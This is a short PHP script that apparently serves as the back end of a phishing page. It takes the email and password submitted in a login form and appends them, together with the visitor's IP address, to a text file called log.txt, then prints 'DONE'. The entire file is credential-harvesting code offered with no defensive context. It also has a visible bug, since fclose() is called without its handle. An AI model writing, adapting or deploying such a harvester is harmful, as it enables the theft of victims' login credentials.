<?php
$username = $_POST['email'];
$password = $_POST['pass'];
$logfile = fopen('log.txt', 'a');
echo "DONE";

$ipaddress = $_SERVER['REMOTE_ADDR'];

fwrite($logfile, $ipaddress . " USER: " . $username . "\n");
//fwrite($logfile, "\n");
fwrite($logfile, "PASSWORD: " . $password . "\n\n");
//fwrite($logfile, "\n");
fclose();
?>
